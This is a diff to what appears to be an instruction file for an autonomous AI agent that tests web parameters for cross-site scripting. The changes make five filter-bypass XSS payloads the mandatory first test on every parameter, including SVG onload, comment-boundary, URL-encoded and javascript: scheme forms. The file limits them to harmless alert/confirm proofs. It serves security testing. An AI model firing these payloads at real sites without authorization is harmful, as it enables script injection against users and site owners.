@@ -7,7 +7,17 @@ report_count: 174
 
 ## Autonomous Testing Priority
 
-**Send the Additional payload set FIRST.** Fixed scan order: (1) the five Additional payloads (step 1 below), (2) inline `<script>`, (3) attribute/handler injection, (4) SVG/mXSS combos, (5) scheme payloads `javascript:` / `java%09script:` / `JaVaScRiPt:` / `jav%61script:` / `data:text/html` **last**. Never open a scan with a scheme payload like `java%09script:document.title='XSS` or a bare `<script>` probe — those are the most-filtered shapes, so starting there makes a live sink look dead.
+**FIRST TEST on every parameter — these five, in this exact order, before any other payload in this skill:**
+
+```text
+JavaScript:confirm`K`
+%27%3C%27s%27v%27g%27+o%27n%27l%27o%27a%27d%27=%27a%27l%27e%27r%27t%27(%277%27)%27+%27%3E%27
+1%3C!--%3E%3CSvg%0COnLoad=(confirm)(7110)--%3E
+1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(1)%3E
+1<!--><Svg/OnLoad=(confirm)(1)-->
+```
+
+Test them on every parameter, in this order, before anything else. Only when all five are filtered, escaped or non-executing on that parameter do you test any other payload in this skill — `<script>`, event handlers, `java%09script:` / `JaVaScRiPt:` variants, mXSS, DOM sinks. Never open with a bare `<script>` or `java%09script:document.title='XSS`.
 
 **Verify reflection before claiming XSS — encoding is everything.**
 
@@ -15,16 +25,9 @@ Your payload must appear in the response body with angle brackets UNESCAPED. `<s
 
 **Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.
 
-**Try these contexts in order — start with the Additional payload set.** The comment-boundary and URL-encoded variants survive the filters, WAF signatures and sanitizer allowlists that block a plain `<script>`, so they get first shot:
+**Try these contexts in order — the five mandatory payloads above come first, in that exact order.** They survive the filters, WAF signatures and sanitizer allowlists that block a plain `<script>`:
 
-1. **Additional payload set first** (the five forms documented under "Additional payload set" below — highest bypass rate, always sent before any baseline payload):
-   ```
-   1<!--><Svg/OnLoad=(confirm)(CANARY)-->
-   1%3C!--%3E%3CSvg%0COnLoad=(confirm)(CANARY)--%3E
-   1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(CANARY)%3E
-   %27%3C%27s%27v%27g%27+o%27n%27l%27o%27a%27d%27=%27a%27l%27e%27r%27t%27(%27CANARY%27)%27+%27%3E%27
-   JavaScript:confirm`CANARY`
-   ```
+1. **The five mandatory payloads above** — same strings, same order; do not reorder them or swap the proof values (`K`, `7`, `7110`, `1`). Only after all five fail on the parameter do you continue with steps 2–4.
 
 2. **Inline script injection** (fallback once the additional set is escaped or stripped and new tags are allowed):
    ```
@@ -193,7 +196,7 @@ For every in-scope reflection or DOM sink, send the additional payload set below
 
 Keep the exact submitted representation and the browser-parsed/decoded representation separate in your notes. Apply URL encoding only when required by the transport layer; do not repeatedly encode a payload or assume that percent-encoded text inside an HTML attribute will be decoded by the browser. For every candidate, verify the final DOM and actual execution in a current browser. Use harmless `confirm()`/`alert()` proofs only; do not turn a proof payload into credential, cookie, token, or data exfiltration.
 
-**Additional payload set — use FIRST, before the baseline payloads below:**
+**Additional payload set — the mandatory first test on every parameter, in this order:**
 
 1. **JavaScript URL scheme with a template literal:**
    ```text
